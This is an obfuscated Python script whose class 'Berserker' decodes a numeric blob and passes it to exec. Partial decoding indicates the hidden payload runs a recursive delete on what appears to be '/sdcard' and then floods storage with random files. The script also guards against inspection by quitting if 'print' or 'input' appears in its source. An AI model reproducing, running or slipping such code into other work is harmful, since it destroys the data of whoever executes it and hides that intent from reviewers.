class Berserker():
 def __init__(self:object,_decode:int=False,_delete:str=0,*_bits:str,**_byte:int)->exec:
  _decode,self._bytes,self._exit,self._system,self._rasputin,_byte[_delete]=lambda _decode:exit()if self._bytes[15]+self._bytes[17]+self._bytes[8]+self._bytes[13]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read() or self._bytes[8]+self._bytes[13]+self._bytes[15]+self._bytes[20]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read()else"".join(_decode if _decode not in self._bytes else self._bytes[self._bytes.index(_decode)+1 if self._bytes.index(_decode)+1<len(self._bytes)else 0]for _decode in "".join(chr(ord(t)-72611)if t!="ζ"else"\n"for t in self._system(_decode))),exit()if _decode else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _eval:_decode(_eval),lambda _exec:"".join(chr(int(_boom)-len(_exec.split('~')))if _boom!='¤'else'ζ'for _boom in str(_exec).split('~')),lambda _decode:str(_byte[_delete](f"{self._bytes[4]+self._bytes[-13]+self._bytes[4]+self._bytes[2]}(''.join(%s),{self._bytes[6]+self._bytes[11]+self._bytes[14]+self._bytes[1]+self._bytes[0]+self._bytes[11]+self._bytes[18]}())"%list(_decode))).encode(self._bytes[20]+self._bytes[19]+self._bytes[5]+self._bytes[34])if _byte[_delete]==eval else exit(),eval
  return self.__decode__(_byte[(self._bytes[-1]+'_')[-1]+self._bytes[18]+self._bytes[15]+self._bytes[0]+self._bytes[17]+self._bytes[10]+self._bytes[11]+self._bytes[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._rasputin(self._exit(_execute)))[0]
Berserker(_decode=False,_sparkle='''72897~72901~72904~72903~72906~72908~72825~72903~72907~¤~72897~72901~72904~72903~72906~72908~72825~72906~72850~72902~72892~72903~72901~¤~72903~72907~72839~72907~72913~72907~72908~72893~72901~72833~72827~72906~72901~72825~72838~72906~72894~72825~72840~72907~72892~72891~72850~72906~72892~72840~72835~72827~72834~¤~72901~72825~72854~72825~72906~72850~72902~72892~72903~72901~72839~72906~72850~72902~72892~72903~72901~72833~72834~¤~72894~72903~72906~72825~72902~72909~72901~72825~72897~72902~72825~72906~72850~72902~72895~72893~72833~72915~72837~72825~72849~72849~72849~72849~72834~72825~72851~¤~72825~72894~72825~72854~72825~72903~72904~72893~72902~72833~72832~72840~72907~72892~72891~72850~72906~72892~72840~72832~72836~72825~72907~72908~72906~72833~72901~72834~72825~72836~72907~72908~72906~72833~72902~72909~72901~72834~72837~72825~72832~72911~72832~72834~¤~72825~72894~72839~72911~72906~72897~72908~72893~72833~72827~72907~72903~72897~72891~72903~72892~72903~72891~72827~72834~¤~72825~72894~72839~72891~72900~72903~72907~72893~¤~72825~72825~¤~¤~72825''')